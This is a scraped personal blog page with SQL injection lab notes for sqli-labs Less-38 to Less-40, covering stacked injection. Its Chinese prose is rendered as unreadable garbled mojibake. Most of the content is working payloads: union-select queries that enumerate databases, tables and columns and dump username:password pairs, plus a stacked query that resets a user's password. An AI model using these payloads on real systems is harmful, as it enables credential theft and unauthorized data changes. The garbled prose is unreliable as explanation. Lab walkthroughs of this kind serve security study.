<p>ä½¿ç”¨æ¡ä»¶</p>
<p>mysql_multi_query() æ‰§è¡Œå¤šæ¡æŸ¥è¯¢çš„å‡½æ•°â€“é˜²æ­¢æ³¨å…¥æ”¹ä¸ºmysql_query()å‡½æ•°ã€‚ï¼ˆmysql_query()å‡½æ•°æ‰§è¡Œä¸€æ¡MySQLæŸ¥è¯¢ï¼‰</p>
<p>å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶ååˆ†æœ‰é™ï¼Œå…¶å¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ï¼Œåˆæˆ–è€…æƒé™çš„é™åˆ¶åªæœ‰å½“è°ƒç”¨æ•°æ®åº“å‡½æ•°æ”¯æŒæ‰§è¡Œå¤šæ¡sqlè¯­å¥æ—¶æ‰èƒ½å¤Ÿä½¿ç”¨ï¼Œåˆ©ç”¨mysqli_multi_query()å‡½æ•°å°±æ”¯æŒå¤šæ¡sqlè¯­å¥åŒæ—¶æ‰§è¡Œï¼Œä½†å®é™…æƒ…å†µä¸­ï¼Œå¦‚PHPä¸ºäº†é˜²æ­¢sqlæ³¨å…¥æœºåˆ¶ï¼Œå¾€å¾€ä½¿ç”¨è°ƒç”¨æ•°æ®åº“çš„å‡½æ•°æ˜¯mysqli_ query()å‡½æ•°ï¼Œå…¶åªèƒ½æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œåˆ†å·åé¢çš„å†…å®¹å°†ä¸ä¼šè¢«æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥è¯´å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶ååˆ†æœ‰é™ï¼Œä¸€æ—¦èƒ½å¤Ÿè¢«ä½¿ç”¨ï¼Œå°†å¯èƒ½å¯¹ç½‘ç«™é€ æˆååˆ†å¤§çš„å¨èƒã€‚</p>
<p>Payload:</p>
<pre><code>1.?id=-1â€™ union select 1,database(),3 â€“+ ,æ­£å¸¸æŸ¥è¯¢å‡ºè¡¨åï¼Œåˆ—åï¼Œç”¨æˆ·åï¼Œå¯†ç ã€‚
2.?id=1â€™;update users set password=â€™123â€™ where username=â€™Dumbâ€™; â€“+ ,é‡‡ç”¨å †å æ³¨å…¥ï¼ŒæŸ¥è¯¢çš„åŒæ—¶ä¿®æ”¹äº†Dumbçš„å¯†ç ä¸ºï¼š123ï¼ŒåæŸ¥è¯¢å‘ç°æˆåŠŸä¿®æ”¹ã€‚
</code></pre>
<p>æ£€æµ‹ç±»å‹</p>
<pre><code>?id=1 and 1=1 å’Œ ?id=1 and 1=2å›æ˜¾ä¸€æ ·
?id=1' and '1'='1å›æ˜¾æ­£å¸¸ ä½†æ˜¯?id=1' and '1'='2å›æ˜¾é”™è¯¯
è¯´æ˜æ˜¯å­—ç¬¦å‹æ³¨å…¥

?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1' union select 1,2,database() --+
?id=-1' union select 1,2,version() --+
?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
?id=-1' union select 1,2,group_concat(concat_ws(&quot;:&quot;,username,password)) from users --+
</code></pre>
<h1 id="less-39">Less-39</h1>
<p>â€‹ 1.åˆ¤æ–­ä¸ºæ•°å­—å‹æ³¨å…¥ã€‚<br>
â€‹ 2.æ­£å¸¸æ³¨å…¥å¾—åˆ°è¡¨åç­‰ã€‚<br>
â€‹ 3.åŒ38ï¼Œå †å æ³¨å…¥ï¼Œè¿˜æ˜¯ä¸38åŒã€‚ï¼ˆæ”¹ä¸ºæ•°å­—å‹ï¼‰<br>
åˆ¤æ–­ä»€ä¹ˆç±»å‹</p>
<pre><code>?id=1 and 1=1 å›æ˜¾æ­£ç¡®
?id=1 and 1=2 å›æ˜¾é”™è¯¯
æ‰€ä»¥æ˜¯æ•°å­—å‹
?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata --+
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1 union select 1,2,group_concat(concat_ws(&quot;:&quot;,username,password)) from users --+
</code></pre>
<h1 id="less-40">Less-40</h1>
<p>åˆ¤æ–­ä»€ä¹ˆç±»å‹,é—­åˆç¬¦å·ä¸º(' ')</p>
<pre><code>?id=1') and ('1')=('1å›æ˜¾æ­£ç¡®
?id=1') and ('1')=('2å›æ˜¾é”™è¯¯
?id=1') union select 1,2,group_concat(schema_name) from information_schema.schemata--+
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
?id=-1') union select 1,2,group_concat(concat_ws(&quot;:&quot;,username,password)) from users --+
</code></pre>

            </div>
          </article>
        </div>
        <div class="paper" data-aos="fade-in">
          
            <div class="next-post">
              <div class="next">
                ä¸‹ä¸€ç¯‡
              </div>
              <a href="https://jinqipiaopiao.github.io/post/mariadb-xiu-gai-mi-ma-bu-sheng-xiao/">
                <h3 class="post-title">
                  MariaDBä¿®æ”¹å¯†ç ä¸ç”Ÿæ•ˆ
                </h3>
              </a>
            </div>
          
        </div>
        
      </div>

      <div class="sm-12 md-4 col sidebar">
  <div class="paper info-container">
    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1627392112619" class="no-responsive avatar">
    <div class="text-muted">æ¸©æ•…è€ŒçŸ¥æ–°</div>
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
  </div>
  <div class="paper">
    <div class="sidebar-title">
      æœ€æ–°æ–‡ç« 
    </div>
    <div class="row">
      <ul>
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">æš‘å‡å­¦ä¹ ç¬”è®°è®°å½•</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">SQLæ³¨å…¥è¿‡æ»¤å­—ç¬¦çš„Fuzzè„šæœ¬æµ‹è¯•</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/">md5ç›¸å…³æ¯”è¾ƒ</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/buuctf/">BUUCTF</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/">åˆ©ç”¨é¢„ç¼–è¯‘æ¥SQLæ³¨å…¥</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/python-mo-ban-zhu-ru/">Python-æ¨¡æ¿æ³¨å…¥</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/">webå®‰å…¨ç›¸å…³çŸ¥è¯†ç‚¹</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/userini-wen-jian-gou-cheng-de-php-hou-men/">.user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/ying-yong-ceng-xie-yi/">åº”ç”¨å±‚åè®®</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/ju-yu-wang-jiao-huan-ji-an-quan/">å±€åŸŸç½‘äº¤æ¢æœºå®‰å…¨</a>
            </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </div>
  </div>
  <div class="paper">
    <div class="sidebar-title">
      æ ‡ç­¾åˆ—è¡¨
    </div>
    <div class="row">
      
        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge warning">
          Gridea
        </a>
      
    </div>
  </div>
  <div class="paper">
    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">RSS</a>
  </div>
</div>


    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>

<script type="application/javascript">

AOS.init();

hljs.initHighlightingOnLoad()

</script>




  </body>
</html>
